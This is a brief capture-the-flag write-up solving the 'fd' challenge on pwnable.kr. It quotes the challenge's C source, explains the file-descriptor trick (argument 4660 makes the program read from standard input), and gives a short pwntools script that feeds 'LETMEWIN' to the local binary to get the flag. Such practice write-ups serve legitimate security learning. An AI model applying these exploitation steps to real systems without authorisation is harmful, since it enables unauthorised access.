this is how i solved the fd challenge on pwnable.kr
char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&lt;2){ printf(&ldquo;pass argv[1] a number\n&rdquo;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&ldquo;LETMEWIN\n&rdquo;, buf)){ printf(&ldquo;good job :)\n&rdquo;); setregid(getegid(), getegid()); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&ldquo;learn about Linux file IO\n&rdquo;); return 0;
}
above is the code that we were given, we can notice that the theme is aboud linux file descriptors , 0 for input , 1 for output, 2 for errors, the trick here is to convince the file descriptor to be 0 so we can input the passkey LETMEWIN
inorder to acoomplish that, notice &ldquo;fd = atoi(argv[1])-0x1234; atoi(argv[1]) must be equal to 0x1234, atoi converts a string to a decimal, so our inputs would be converted to a decimal number, 0x1234 is equal to 4660. the input must be equal to 4660.
using pwntools i crafted the following payload:
from pwn import *
p = process([&rsquo;./fd&rsquo;, &lsquo;4660&rsquo;]) p.send(b&rsquo;LETMEWIN\n&rsquo;) print(p.recvall().decode())
which then i receieved the flag.
